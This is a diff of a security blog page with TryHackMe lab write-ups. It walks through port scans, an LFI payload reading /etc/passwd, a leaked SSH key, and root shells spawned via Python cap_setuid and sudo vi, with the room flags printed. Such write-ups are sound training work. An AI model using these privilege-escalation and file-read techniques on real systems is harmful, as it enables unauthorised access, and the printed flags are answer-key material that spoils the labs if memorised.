+    <div id="step-5-privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-5-privilege-escalation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>From here, I downloaded the <code>linpeas.sh</code> script to my attacker machine and sent it to the vulnerable target using a python web server. I then uncovered something when I ran the script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;-----------------------SNIP----------------------&gt;
+</span></span><span class="line"><span class="cl">Files with capabilities <span class="o">(</span>limited to 50<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">/snap/core20/2434/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
+</span></span><span class="line"><span class="cl">/snap/core22/1621/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
+</span></span><span class="line"><span class="cl">/snap/core22/2010/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
+</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin<span class="o">=</span>ep
+</span></span><span class="line"><span class="cl">/usr/bin/python3.10 <span class="nv">cap_setuid</span><span class="o">=</span>ep
+</span></span><span class="line"><span class="cl">/usr/bin/mtr-packet <span class="nv">cap_net_raw</span><span class="o">=</span>ep
+</span></span><span class="line"><span class="cl">/usr/bin/ping <span class="nv">cap_net_raw</span><span class="o">=</span>ep
+</span></span><span class="line"><span class="cl">&lt;-----------------------SNIP----------------------&gt;
+</span></span></code></pre></div><p><strong><code>cap_setuid</code></strong> allows Python to <strong>set UID to root</strong>! Therefore, we can exploit it to get a root shell.</p>
+<p><strong>Exploiting Python Capabilities</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fabiano@tryhackme-2204:/tmp$ /usr/bin/python3.10 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/tmp
+</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# ls /root
+</span></span><span class="line"><span class="cl">root.txt  snap
+</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>check_check_check_mate<span class="o">}</span>
+</span></span><span class="line"><span class="cl">root@tryhackme-2204:/tmp# 
+</span></span></code></pre></div>
+<h3 class="relative group">Attack Path Summary 
+    <div id="attack-path-summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#attack-path-summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>Port Scan</strong> → Found <strong><code>finger</code></strong> (port 79) and HTTP (port 80).</li>
+<li><strong>Finger Enumeration</strong> → Leaked <strong><code>fabiano</code></strong>&rsquo;s password via <strong><code>.plan</code></strong>.</li>
+<li><strong>SSH Login</strong> → Gained initial shell.</li>
+<li><strong>Capabilities Abuse</strong> → Used <strong><code>python3.10</code></strong>&rsquo;s <strong><code>cap_setuid</code></strong> to escalate to root.</li>
+</ol>
+
+<h2 class="relative group">Under Construction 
+    <div id="under-construction" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#under-construction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">Description 
+    <div id="description-6" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-6" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>ZeroTrace wastes no time: one misstep in the plant&rsquo;s login routine, and she&rsquo;s in. Credentials, shells, root, factory systems fall in quick succession.</p></blockquote>
+<p><strong>Target IP:</strong> <strong><code>10.10.27.251</code></strong></p>
+
+<h3 class="relative group">Step 1: Reconnaissance (Port Scanning with Nmap) 
+    <div id="step-1-reconnaissance-port-scanning-with-nmap" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-reconnaissance-port-scanning-with-nmap" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>First, I scanned the target machine to identify open ports and services:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# nmap -sCV -p- -T4 10.10.191.157
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-29 11:30 BST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-191-157.eu-west-1.compute.internal <span class="o">(</span>10.10.191.157<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00022s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Industrial Dev Solutions
+</span></span><span class="line"><span class="cl">MAC Address: 02:AA:E7:4C:C1:97 <span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 10.67 seconds
+</span></span><span class="line"><span class="cl">root@ip-10-10-46-202:~# 
+</span></span></code></pre></div><p><strong>Findings:</strong></p>
+<ul>
+<li><strong>Port 22 (SSH)</strong> - OpenSSH 9.6p1</li>
+<li><strong>Port 80 (HTTP)</strong> - Apache 2.4.58 (Ubuntu)</li>
+</ul>
+
+<h3 class="relative group">Web Enumeration 
+    <div id="web-enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#web-enumeration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Visited <strong><code>http://10.10.27.251</code></strong> and found a simple website.</p>
+<p>Ran <strong><code>gobuster</code></strong> to find hidden directories:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# gobuster dir -u http://10.10.27.251 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.27.251
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.27.251/assets/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/keys                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.27.251/keys/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">218275</span> / <span class="m">218276</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span></code></pre></div><p><strong>Key Findings:</strong></p>
+<ul>
+<li><strong><code>/view.php?page=about.php</code></strong> (LFI vulnerability found)</li>
+</ul>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="PossibleLFI.png" src="/images/THM/UnderConstruction/PossibleLFI.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">Step 2: Exploiting LFI (Local File Inclusion) 
+    <div id="step-2-exploiting-lfi-local-file-inclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-exploiting-lfi-local-file-inclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The <strong><code>view.php</code></strong> page had a parameter <strong><code>page</code></strong> vulnerable to LFI. Exploited by this payload: <code>&quot;http://10.10.27.251/view.php?page=../../../../etc/passwd&quot;</code></p>
+<ul>
+<li>LFI was confirmed - showing available users like Dev:</li>
+</ul>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="ConfirmedLFIandUserDEV.png" src="/images/THM/UnderConstruction/ConfirmedLFIandUserDEV.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">Step 3: Finding SSH Keys(Exploring <code>/keys/</code> Directory) 
+    <div id="step-3-finding-ssh-keysexploring-keys-directory" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-3-finding-ssh-keysexploring-keys-directory" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Found an SSH private key:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Keys_Directory.png" src="/images/THM/UnderConstruction/Keys_Directory.png">
+
+  
+</figure>
+</p>
+<ul>
+<li><strong><code>/keys/</code></strong> (directory containing an SSH private key)</li>
+</ul>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Key09.png" src="/images/THM/UnderConstruction/Key09.png">
+
+  
+</figure>
+</p>
+<p>Saved it as <strong><code>id_rsa</code></strong> and set permissions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# nano id_rsa
+</span></span><span class="line"><span class="cl">root@ip-10-10-46-202:~# chmod <span class="m">600</span> id_rsa
+</span></span></code></pre></div>
+<h3 class="relative group">SSH Access 
+    <div id="ssh-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ssh-access" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Logged in as <strong><code>dev</code></strong> using the key:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-46-202:~# ssh -i id_rsa dev@10.10.27.251
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.27.251 (10.10.27.251)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:0DorHlp1XSJDyXeM2nQsfJCMv8z0xEZrJB0lIIVFHR0.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.27.251<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 24.04.2 LTS <span class="o">(</span>GNU/Linux 6.8.0-1030-aws x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Sun Jun <span class="m">29</span> 10:55:05 UTC <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.01               Temperature:           -273.1 C
+</span></span><span class="line"><span class="cl">  Usage of /:   16.1% of 19.31GB   Processes:             <span class="m">116</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 13%                Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Swap usage:   0%                 IPv4 address <span class="k">for</span> ens5: 10.10.27.251
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Ubuntu Pro delivers the most comprehensive open <span class="nb">source</span> security and
+</span></span><span class="line"><span class="cl">   compliance features.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   https://ubuntu.com/aws/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
+</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Tue Jun <span class="m">24</span> 16:39:49 <span class="m">2025</span> from 10.13.57.153
+</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>nic3_j0b_You_got_it_w00tw00t<span class="o">}</span>
+</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ 
+</span></span></code></pre></div><p><strong>Success!</strong> Got a shell as <strong><code>dev</code></strong> and got the user flag.</p>
+
+<h3 class="relative group">Step 4: Privilege Escalation (Checking Sudo Permissions) 
+    <div id="step-4-privilege-escalation-checking-sudo-permissions" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-4-privilege-escalation-checking-sudo-permissions" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Ran <strong><code>sudo -l</code></strong> to see what commands <strong><code>dev</code></strong> could run:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dev@tryhackme-2404:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> dev on tryhackme-2404:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User dev may run the following commands on tryhackme-2404:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/vi
+</span></span><span class="line"><span class="cl">dev@tryhackme-2404:~$ sudo vi -c <span class="s1">&#39;:!/bin/bash&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">^<span class="o">[[</span>Iroot@tryhackme-2404:/home/dev# <span class="nb">cd</span> root
+</span></span><span class="line"><span class="cl">bash: cd: root: No such file or directory
+</span></span><span class="line"><span class="cl">root@tryhackme-2404:/home/dev# <span class="nb">cd</span> /root
+</span></span><span class="line"><span class="cl">root@tryhackme-2404:~# cat root.txt
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>y0u_g0t_it_welldoneeeee<span class="o">}</span>
+</span></span><span class="line"><span class="cl">root@tryhackme-2404:~# 
+</span></span></code></pre></div>
+<h3 class="relative group">Escalating to Root via <code>vi</code> 
+    <div id="escalating-to-root-via-vi" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#escalating-to-root-via-vi" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Since <strong><code>vi</code></strong> can execute shell commands, spawned a root shell that got us the root flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo vi -c <span class="s1">&#39;:!/bin/bash&#39;</span>
+</span></span></code></pre></div><p><strong>Root Flag:</strong> <strong><code>THM{y0u_g0t_it_welldoneeeee}</code></strong></p>
+
+<h3 class="relative group">Vulnerabilities Exploited 
+    <div id="vulnerabilities-exploited" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#vulnerabilities-exploited" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>LFI in <code>view.php</code></strong> → Allowed reading system files.</li>
+<li><strong>Exposed SSH Key</strong> → Gained initial shell access.</li>
+<li><strong>Misconfigured Sudo (<code>vi</code> with NOPASSWD)</strong> → Privilege escalation to root.</li>
+</ol>
+<hr>
+
           
           
           
@@ -917,7 +2294,7 @@ Be sure to check all the open ports, you never know which one might be your way 
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/2024-11-29-dnadesign/2024-11-29-dnadesign/">
+            <a class="flex group mr-3" href="/posts/2025-06-01-kenyacyberlympics/kenya-cyberlympics-2025/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -928,11 +2305,11 @@ Be sure to check all the open ports, you never know which one might be your way 
               >
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >DNA & Design</span
+                  >Kenya Cyberlympics 2025</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2024-11-29T01:09:33&#43;03:00">29 November 2024</time>
+                    <time datetime="2025-06-01T01:09:33&#43;03:00">1 June 2025</time>
                   
                 </span>
               </span>
